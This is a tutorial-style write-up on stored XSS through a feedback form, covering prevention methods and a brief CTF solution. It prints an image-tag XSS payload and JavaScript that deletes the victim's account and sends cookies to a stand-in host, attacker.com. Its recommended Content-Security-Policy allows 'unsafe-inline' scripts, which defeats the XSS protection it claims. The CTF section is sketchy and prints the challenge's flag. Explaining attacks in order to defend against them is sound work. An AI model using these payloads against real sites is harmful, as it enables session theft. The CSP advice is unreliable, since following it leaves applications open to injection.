# Stored XSS Attack via Feedback Form & Prevention

## How the Attack Works (Stored XSS)

### Attack Flow:
1. **Injection Point**: Malicious user submits JavaScript in a feedback form  
   Example payload:  
   ```html
   <img src=x onerror=alert(1337) />
   ```
   *(Proof-of-concept that verifies XSS vulnerability)*

2. **Storage**: Server saves the unsanitized input to database

3. **Execution**: When another user (e.g., admin) views the feedback:
   * Malicious script executes in their browser
   * Runs with the victim's permissions/session

4. **Impact**: Can perform any action the victim is authorized to do:
   ```javascript
   // Delete account silently
   fetch('/api/account/delete', { 
     method: 'POST', 
     credentials: 'include' 
   });
   
   // Steal session cookies
   fetch('https://attacker.com/steal?cookie='+document.cookie);
   ```

## Prevention Methods

### 1. Input Sanitization (Backend)
* **Remove/escape dangerous content before storage**:
  ```python
  # Django example
  from django.utils.html import escape
  cleaned_input = escape(user_input)
  ```

* **Use dedicated libraries**:
  * `DOMPurify` (Node.js/JavaScript)
  * `OWASP Java Encoder` (Java)
  * `htmlspecialchars()` (PHP)

### 2. Output Encoding (Frontend)
* **Modern frameworks auto-escape**:
  ```jsx
  // React example - safe by default
  function Feedback({ text }) {
    return <div>{text}</div>; // Auto-escaped
  }
  ```

* **Manual escaping for raw HTML**:
  ```javascript
  // UNSAFE:
  element.innerHTML = userContent;
  
  // SAFE:
  element.textContent = userContent;
  ```

### 3. Content Security Policy (CSP)
* **HTTP header to restrict script sources**:
  ```text
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
  ```

### 4. Additional Protections
* **HttpOnly cookies**: Prevent JavaScript cookie access
* **CSRF tokens**: Required for state-changing requests
* **Framework protections**:
  * Django's template auto-escaping
  * Rails' `sanitize` helper
  * Laravel's Blade escaping

## CTF Challenge Solution

In this specific case, the flag was obtained by:

```
Form inputs: { name: "anything", message: "script" }
Flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```

*(Indicates the system had no XSS protections in place)*

## Key Takeaway

Always sanitize user input and encode output. Modern frameworks provide these protections by default - bypassing them requires intentional unsafe practices.